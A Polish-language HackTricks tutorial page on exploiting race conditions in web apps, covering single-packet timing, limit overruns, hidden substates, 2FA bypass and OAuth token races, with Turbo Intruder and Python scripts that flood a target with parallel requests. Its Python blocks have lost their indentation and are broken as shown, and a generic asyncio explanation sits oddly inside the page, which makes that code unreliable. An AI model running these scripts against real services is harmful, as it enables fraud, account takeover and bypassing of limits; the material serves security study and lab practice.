# Wyścig warunkowy

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

{% hint style="warning" %}
Aby uzyskać głębokie zrozumienie tej techniki, sprawdź oryginalne zgłoszenie na stronie [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Wzmacnianie ataków wyścigowych

Główną przeszkodą w wykorzystaniu wyścigowych warunków jest upewnienie się, że wiele żądań jest obsługiwanych jednocześnie, z **bardzo małą różnicą w czasie ich przetwarzania - idealnie poniżej 1 ms**.

Oto kilka technik synchronizacji żądań:

#### Atak pojedynczego pakietu HTTP/2 kontra synchronizacja ostatniego bajtu HTTP/1.1

- **HTTP/2**: Obsługuje wysyłanie dwóch żądań przez jedno połączenie TCP, zmniejszając wpływ fluktuacji sieciowej. Jednak z powodu różnic po stronie serwera, dwie żądania mogą nie wystarczyć do spójnego wykorzystania wyścigowych warunków.
- **HTTP/1.1 'Synchronizacja ostatniego bajtu'**: Umożliwia wcześniejsze wysłanie większości części 20-30 żądań, z zatrzymaniem małego fragmentu, który jest następnie wysyłany razem, osiągając jednoczesne dotarcie do serwera.

**Przygotowanie do synchronizacji ostatniego bajtu** obejmuje:
1. Wysłanie nagłówków i danych ciała bez zakończenia strumienia.
2. Pauza przez 100 ms po początkowym wysłaniu.
3. Wyłączenie TCP_NODELAY w celu wykorzystania algorytmu Nagle'a do partycjonowania końcowych ramek.
4. Pingowanie w celu rozgrzania połączenia.

Następne wysłanie zatrzymanych ramek powinno skutkować ich dotarciem w jednym pakiecie, co można zweryfikować za pomocą Wiresharka. Ta metoda nie dotyczy plików statycznych, które zazwyczaj nie są zaangażowane w ataki RC.

### Dostosowanie do architektury serwera

Zrozumienie architektury docelowego serwera jest kluczowe. Serwery front-endowe mogą kierować żądania w różny sposób, co wpływa na czasowanie. Wstępne rozgrzewanie połączenia po stronie serwera poprzez nieistotne żądania może znormalizować czasowanie żądań.

#### Obsługa blokady opartej na sesji

Frameworki takie jak PHP obsługują żądania szeregowo według sesji, co potencjalnie utrudnia wykrycie podatności. Wykorzystanie różnych tokenów sesji dla każdego żądania może obejść ten problem.

#### Przezwyciężanie limitów częstotliwości lub zasobów

Jeśli rozgrzewanie połączenia jest nieskuteczne, celowe wywołanie opóźnień limitów częstotliwości lub zasobów serwerów WWW poprzez zalewanie fałszywymi żądaniami może ułatwić atak pojedynczego pakietu, wywołując opóźnienie po stronie serwera sprzyjające wyścigowym warunkom.


## Przykłady ataków

* **Tubo Intruder - atak pojedynczego pakietu HTTP2 (1 punkt końcowy)**: Możesz wysłać żądanie do **Turbo Intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), możesz zmienić wartość, którą chcesz przeprowadzić atak brute force dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, a następnie wybrać **`examples/race-single-packer-attack.py`** z listy rozwijanej:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Jeśli zamierzasz **wysłać różne wartości**, możesz zmodyfikować kod na taki, który korzysta z listy haseł z schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Jeśli strona internetowa nie obsługuje HTTP2 (tylko HTTP1.1), użyj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - atak jednopakietowy HTTP2 (wiele punktów końcowych)**: Jeśli musisz wysłać żądanie do jednego punktu końcowego, a następnie wiele żądań do innych punktów końcowych, aby wywołać RCE, możesz zmodyfikować skrypt `race-single-packet-attack.py` na coś takiego:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Jest również dostępny w **Repeaterze** za pomocą nowej opcji '**Wysyłaj grupę równolegle**' w Burp Suite.
* Dla **limit-overrun** można po prostu dodać **tę samą prośbę 50 razy** do grupy.
* Dla **rozgrzewania połączenia** można na **początku grupy** dodać kilka **prośb** do niezmiennego elementu serwera internetowego.
* Aby **opóźnić** proces **między** przetwarzaniem **jednej prośby a drugą** w dwóch krokach podstanu, można **dodać dodatkowe prośby między** tymi dwoma prośbami.
* Dla wielopunktowego RC można zacząć wysyłać **prośbę**, która **przechodzi do ukrytego stanu**, a następnie **50 prośb** zaraz po niej, które **wykorzystują ukryty stan**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Surowy BF

Przed poprzednimi badaniami używano tych ładunków, które po prostu próbowały wysłać pakiety tak szybko, jak to możliwe, aby spowodować RC.

* **Repeater:** Sprawdź przykłady z poprzedniej sekcji.
* **Intruder**: Wyślij **prośbę** do **Intrudera**, ustaw **liczbę wątków** na **30** w menu **Opcje**, wybierz jako ładunek **Puste ładunki** i wygeneruj **30**.
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**

Python - asyncio to biblioteka do asynchronicznego programowania w języku Python. Pozwala na tworzenie efektywnych i skalowalnych aplikacji, które wykorzystują asynchroniczne operacje wejścia/wyjścia. Biblioteka asyncio dostarcza mechanizmy do obsługi zdarzeń, takich jak wywołania zwrotne (callbacks) i korutyny (coroutines), które umożliwiają równoległe wykonywanie wielu zadań.

Aby rozpocząć korzystanie z asyncio, należy zaimportować moduł `asyncio`. Następnie można zdefiniować funkcje korutynowe przy użyciu słowa kluczowego `async` przed definicją funkcji. Funkcje korutynowe mogą być wywoływane za pomocą funkcji `await`, co pozwala na oczekiwanie na zakończenie innej korutyny bez blokowania wykonywania innych zadań.

Przykład użycia asyncio w Pythonie:

```python
import asyncio

async def hello():
    print("Hello")
    await asyncio.sleep(1)
    print("World")

async def main():
    await asyncio.gather(hello(), hello(), hello())

asyncio.run(main())
```

W powyższym przykładzie definiujemy dwie funkcje korutynowe: `hello()` i `main()`. Funkcja `hello()` wypisuje "Hello", czeka przez 1 sekundę przy użyciu `asyncio.sleep(1)`, a następnie wypisuje "World". Funkcja `main()` używa funkcji `asyncio.gather()` do równoczesnego wywołania trzech instancji funkcji `hello()`. Wywołanie `asyncio.run(main())` uruchamia program i wykonuje wszystkie korutyny.

Dzięki bibliotece asyncio w Pythonie można łatwo tworzyć asynchroniczne programy, które są wydajne i skalowalne.
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Limit przekroczenia / TOCTOU

To najprostszy rodzaj wyścigówki, w którym występują podatności w miejscach, które ograniczają liczbę razy, jaką można wykonać daną czynność. Na przykład używanie tego samego kodu rabatowego kilka razy w sklepie internetowym. Bardzo łatwy przykład można znaleźć w [**tym raporcie**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**tym błędzie**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariantów tego rodzaju ataku, w tym:

* Wielokrotne wykorzystanie karty podarunkowej
* Wielokrotne ocenianie produktu
* Wypłacanie lub transferowanie gotówki przekraczającej saldo konta
* Ponowne wykorzystanie jednego rozwiązania CAPTCHA
* Ominięcie limitu szybkości anty-brute-force

### **Ukryte podstany**

Wykorzystywanie złożonych wyścigówek często wiąże się z korzystaniem z krótkotrwałych okazji do interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak do tego podejść:

1. **Identyfikacja potencjalnych ukrytych podstanów**
- Zacznij od zlokalizowania punktów końcowych, które modyfikują lub oddziałują na krytyczne dane, takie jak profile użytkowników lub procesy resetowania hasła. Skup się na:
- **Przechowywanie**: Preferuj punkty końcowe, które manipulują danymi przechowywanymi po stronie serwera, w przeciwieństwie do tych obsługujących dane po stronie klienta.
- **Działanie**: Szukaj operacji, które zmieniają istniejące dane, ponieważ są bardziej podatne na tworzenie warunków podatnych na atak w porównaniu do tych, które dodają nowe dane.
- **Kluczowanie**: Udane ataki zwykle obejmują operacje kluczowane tym samym identyfikatorem, np. nazwą użytkownika lub tokenem resetowania.

2. **Pierwsze sondowanie**
- Przetestuj zidentyfikowane punkty końcowe za pomocą ataków wyścigówkowych, obserwując wszelkie odstępstwa od oczekiwanych wyników. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mogą wskazywać na podatność.

3. **Wykazanie podatności**
- Ogranicz atak do minimalnej liczby żądań potrzebnych do wykorzystania podatności, często tylko dwóch. Ten krok może wymagać wielokrotnych prób lub automatyzacji ze względu na precyzyjne wymagania czasowe.

### Ataki zależne od czasu

Precyzja w czasie żądań może ujawnić podatności, zwłaszcza gdy do generowania tokenów bezpieczeństwa używane są przewidywalne metody, takie jak znaczniki czasowe. Na przykład generowanie tokenów resetowania hasła na podstawie znaczników czasowych może umożliwić uzyskanie identycznych tokenów dla równoczesnych żądań.

**Aby wykorzystać:**
- Użyj precyzyjnego czasowania, takiego jak atak jednopakietowy, aby wysłać równoczesne żądania resetowania hasła. Identyczne tokeny wskazują na podatność.

**Przykład:**
- Poproś o dwa tokeny resetowania hasła w tym samym czasie i porównaj je. Pasujące tokeny sugerują wadliwe generowanie tokenów.

**Sprawdź ten [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities), aby to wypróbować.**


## Studia przypadków ukrytych podstanów

### Płatność i dodanie przedmiotu

Sprawdź ten [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), aby zobaczyć, jak **zapłacić** w sklepie i **dodać dodatkowy** przedmiot, za który **nie trzeba płacić**.

### Potwierdzanie innych adresów e-mail

Idea polega na **zweryfikowaniu adresu e-mail i jednoczesnej zmianie go na inny**, aby sprawdzić, czy platforma weryfikuje nowy adres.

### Zmiana adresu e-mail na 2 adresy oparte na plikach cookie

Według [**tego badania**](https://portswigger.net/research/smashing-the-state-machine) Gitlab był podatny na przejęcie w ten sposób, ponieważ mógł **wysłać** **token weryfikacyjny e-maila jednego adresu e-mailowego na inny adres e-mailowy**.

**Sprawdź ten [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint), aby to wypróbować.**

### Ukryte stany bazy danych / Ominięcie potwierdzenia

Jeśli do **dodania informacji** do **bazy danych** używane są **2 różne zapisy**, istnieje mały okres czasu, w którym **tylko pierwsze dane zostały zapisane** w bazie danych. Na przykład, podczas tworzenia użytkownika **nazwa użytkownika** i **hasło** mogą zostać **zapisane**, a następnie zapisywany jest **token** do potwierdzenia nowo utworzonego konta. Oznacza to, że przez krótki czas **token do potwierdzenia konta jest pusty**.

Dlatego **rejestrując konto i wysyłając kilka żądań z pustym tokenem** (`token=` lub `token[]=` lub inna wariacja), aby natychmiast potwierdzić konto, można potwierdzić konto, którego e-mailem nie kontrolujesz.

**Sprawdź ten [PortSwigger Lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction), aby to wypróbować.**

### Ominięcie 2FA

Poniższy pseudokod jest podatny na wyścigówkę, ponieważ przez bardzo krótki czas **2FA nie jest wymagane**, podczas gdy tworzona jest sesja:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Wieczysta trwałość OAuth2

Istnieje kilka [**dostawców OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Usługi te umożliwiają tworzenie aplikacji i uwierzytelnianie użytkowników zarejestrowanych w dostawcy. Aby to zrobić, **klient** musi **udzielić pozwolenia Twojej aplikacji** na dostęp do niektórych danych wewnątrz dostawcy OAuth.\
Więc do tej pory to tylko zwykłe logowanie za pomocą Google/LinkedIn/GitHub... gdzie pojawia się strona informująca: "_Aplikacja \<InsertCoolName> chce uzyskać dostęp do Twoich informacji, czy chcesz jej to zezwolić?_"

#### Wyścig warunkowy w `authorization_code`

**Problem** pojawia się, gdy **zaakceptujesz** i automatycznie zostanie wysłany **`authorization_code`** do złośliwej aplikacji. Następnie ta aplikacja wykorzystuje wyścig warunkowy w dostawcy usługi OAuth, aby wygenerować więcej niż jedno AT/RT (_Authentication Token/Refresh Token_) na podstawie **`authorization_code`** dla Twojego konta. W zasadzie wykorzysta fakt, że zezwoliłeś aplikacji na dostęp do swoich danych, aby **utworzyć kilka kont**. Jeśli przestaniesz zezwalać aplikacji na dostęp do swoich danych, jedna para AT/RT zostanie usunięta, ale pozostałe będą wciąż ważne.

#### Wyścig warunkowy w `Refresh Token`

Po uzyskaniu **ważnego RT** możesz spróbować go wykorzystać do wygenerowania kilku AT/RT, nawet jeśli użytkownik anuluje uprawnienia dla złośliwej aplikacji do dostępu do swoich danych, **kilka RT wciąż będzie ważnych**.

## **RC w WebSockets**

W [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) znajdziesz PoC w języku Java, który wysyła wiadomości websocket w **trybie równoległym**, aby wykorzystać **wyścigi warunkowe również w WebSockets**.

## Odwołania

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
